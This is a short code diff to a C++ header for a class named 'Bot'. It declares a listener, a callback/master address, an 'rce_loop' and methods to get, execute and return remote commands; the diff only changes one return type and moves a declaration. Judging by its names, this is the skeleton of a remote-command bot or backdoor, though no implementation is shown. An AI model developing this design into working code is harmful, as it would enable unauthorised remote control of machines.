@@ -10,7 +10,7 @@ class Bot {
 
     int start_listener(); // Starts the listener (Creates and backgrounds the listener)
     int stop_listener();  // Stops the listener thread and closes listener fd
-    int rce_loop();       // Starts on connection
+    void rce_loop();      // Starts on connection
 
   private:
     sockaddr_in m_callback_addr;   // Callback/Master Address
@@ -26,8 +26,8 @@ class Bot {
     bool is_running();         // Checks if the thread is running
     void accept_loop();        // Runs in the thread and accepts connections (sets m_rce)
 
+    bool is_connected();                          // Checks if a connection is active
     std::string get_command();                    // Gets command from connection
     std::string execute_command(std::string cmd); // Executes command
     int send_output(std::string output);          // Sends command output back through connection
-    bool is_connected();                          // Checks if a connection is active
 };
